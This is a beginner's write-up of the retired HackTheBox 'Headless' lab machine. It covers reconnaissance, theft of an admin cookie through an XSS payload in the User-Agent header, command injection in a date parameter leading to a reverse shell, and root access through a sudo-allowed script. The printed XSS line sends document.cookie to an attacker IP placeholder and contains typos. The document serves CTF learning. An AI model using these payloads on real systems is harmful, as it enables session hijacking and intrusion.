# HackTheBox Headless Easy Machine Write Up
<div align="center">
  <img src=https://github.com/user-attachments/assets/2ffbf2f2-5397-44d4-840a-3040409e956c>
</div>

## Machine Description

Headless is a retired easy machine from HackTheBox. This machine is good to learn cookie stealing using XSS and gain root privilege using allowed sudo file. To be honest, when I'm solving this, I followed a walkthrough on Youtube from PinkDraconian channel because I am a newbie and I am not familiar with XSS. If you want to check out his youtube, here is the link [https://www.youtube.com/watch?v=JT4bYzMUDMs](PinkDraconian).
Okay, let's start!.

## Enumartion and Reconnaissance

Like always in penetration testing, we need to do enumaration and recon first. I did Port scanning with `nmap` and directory enumaration with `gobuster`.

<br/><br/>

### Port Scanning with Nmap

Payload:

    nmap <MACHINE_IP> -p- -sC -T5 -O -oN nmap1.txt

<br/><br/>


<div align="center">
  <img src=https://github.com/user-attachments/assets/ca563449-3797-43af-9ef5-d6f05bcb18ca>
<br/><br/>
</div>

<div align="center">
  **Nmap Output**
</div>

From the nmap output, I got a few ports but only 2 that are open, **ssh** on port 22 and **upnp** on port 5000. Next, I tried to see if there's a web page for upnp on port 5000. So, i enter it on my web browser. Turns out, it did has a web page.
<br/><br/>

<div align="center">
  <img src=https://github.com/user-attachments/assets/06fc25d0-94fd-4e77-a111-5db7dc02c189>
<br/><br/>
</div>

<div align="center">
  **UPNP web page**
</div>

It says that we can send a question so I clicked on that button and redirected to another page in `/support`.
<br/><br/>

<div align="center">
  <img src=https://github.com/user-attachments/assets/ab9307cd-11d1-42f5-ab9d-72220f6cda10>
<br/><br/>
</div>

<div align="center">
 **/support page**
</div>
<br/><br/>

This could be vulnerable to XSS attack.

<br/><br/>

### Directory Enumeration with GoBuster

After find out that the port 5000 has a web page and a `/support` directory, I tried to look for another directory that might be available.

<br/><br/>

<div align="center">
  <img src=https://github.com/user-attachments/assets/a134a427-97a1-4153-b81c-4c8f4b84c2d2>
</div>

<br/><br/>

<div align="center">
  **Gobuster output**
</div>

<br/><br/>

From `gobuster` output, I got two directory, one is the `/supoort` directory and another one is `/dashboard` but it only allowed authorized user.


## Exploitation

### Cookie Stealing with XSS attack

So, after finding another directory, I inspected the web on `/support` and check on storage and found this web use `is_admin` cookie. When I checked it, it says mine is user so i need to find admin's cookie and change it into my browser.

So, next thing I did was trying to submit a question but on the message, I filled it with XSS payload.

First XSS payload:

    <script>alert()</script>

But, the web knew that it was XSS and report it.

So, by following **PinkDraconian** on Youtube, he changed the `User Agent` from Mozilla (web browser agent that he used) into XSS payload. The XSS payload that he used was something that when an admin see the malicious post, it will give an error and automatically write a document with image tag and source to attacker's server and send the admin's cookie to attacker (something like that, you can see his explanation it's very good and clear).

Following him with the payload, I used the same payload as him.

Payload:

    <img src=x onerror='dociument.write("<img src=http://<YOUR_IP:<YOUR_PORT>/Cookies + "document.cookie + ">")'

I changed my User Agent with the payload and the message with previous alert() payload. I wait for a few seconds and got the admin's is_admin cookie.

<br/><br/>

<div align="center">
  <img src=https://github.com/user-attachments/assets/337dadc2-369a-4450-b86a-095185c3db86>
</div>
<br/><br/>

<div align="center">**admin's cookie**</div>
<br/><br/>

Next, I changed my cookie into admin's cookie and enter the /dashboard directory successfully redirected into administrator dashboard.

<div align="center">
  <img src=https://github.com/user-attachments/assets/72b7e3d9-b66a-4c1d-9f7f-537dfbec1dc6>
</div>
<br/><br/>

<div align="center">
  **Administrator Dashboard**
</div>

In the administrator dashboard, we can generate report with a date. So, I looked up with `Burpsuite` to see what is the payload that were sent to the server. Turns out it was just date. By following **PinkDraconian**, I found out that we can try command injection by adding command after the date, `date;<yourcommand>`.

So, I tried with `ls` command to see can I see files in this directory.

<div align="center">
  <img src=https://github.com/user-attachments/assets/339cf741-8977-42a2-8358-108580212add>
</div>
<br/><br/>

After found out that I can use command to see the files, I used reverse shell payload. I used a python shortest payload and make it URL encoded from [https://revshells.com](revshells) following the walkthrough.

Turn on listener with netcat and send it, I got the shell.

<div align="center">
  <img src=https://github.com/user-attachments/assets/fbce13bf-8bce-4caf-ae49-afc91e10ac62>
</div>
<br/><br/>

Because I already a user not www-data, I can open the user.txt

### Privilege Escelation

To do privilege escelation, I ran `sudo -l` to see if user **dvir** allowed to sudo something, and it did.

<div align="center">
  <img src=https://github.com/user-attachments/assets/1808e5b9-c062-45b4-a9f3-bdd462f7a55a>
</div>
<br/><br/>

User dvir is allowed to run `/usr/bin/syscheck`. When I open the file wiith `cat`, It says that if we run this file, it will run .sh file, which in this case is `./initdb.sh`.

<div align="center">
  <img src=https://github.com/user-attachments/assets/8fdfe1d8-9219-4a29-9625-3d0637a26185>
</div>
<br/><br/>

Next, I overwite that file into `bash`, so when it's run by me, it will run bash and grant us to root.

![Screenshot 2024-11-03 110037](https://github.com/user-attachments/assets/261cfe30-2322-42dc-a8b0-a45f207f60e7)
<br/><br/>

After overwriting, I ran it and got root access and read the root.txt

![Screenshot 2024-11-03 110127](https://github.com/user-attachments/assets/ebbaefa8-c998-4157-9230-f6ddbf45ed95)


Okay, that's all. Thank you for [https://www.youtube.com/watch?v=JT4bYzMUDMs](PinkDraconian) for the walkthrough, you guys can check out his video its very thorough and easy to understand. Thank you for reading!


